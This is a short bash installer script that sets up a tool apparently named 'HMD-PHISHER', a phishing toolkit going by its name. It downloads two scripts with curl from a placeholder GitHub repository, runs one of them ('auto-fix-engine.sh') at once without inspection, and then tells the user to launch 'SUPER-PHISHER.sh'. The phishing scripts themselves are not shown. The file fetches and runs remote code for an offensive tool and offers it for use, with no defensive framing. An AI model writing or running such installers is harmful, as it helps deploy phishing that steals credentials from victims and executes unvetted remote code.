#!/bin/bash
# TURBO INSTALLER - ONE COMMAND SETUP

echo "🚀 TURBO INSTALLING HMD-PHISHER..."

# Create directory
mkdir -p hmd-phisher
cd hmd-phisher

# Download all scripts
curl -s https://raw.githubusercontent.com/your-repo/hmd-phisher/main/SUPER-PHISHER.sh -o SUPER-PHISHER.sh
curl -s https://raw.githubusercontent.com/your-repo/hmd-phisher/main/auto-fix-engine.sh -o auto-fix-engine.sh

# Make executable
chmod +x *.sh

# Run auto-fix
./auto-fix-engine.sh

echo "✅ TURBO INSTALLATION COMPLETE"
echo "👉 Run: ./SUPER-PHISHER.sh"
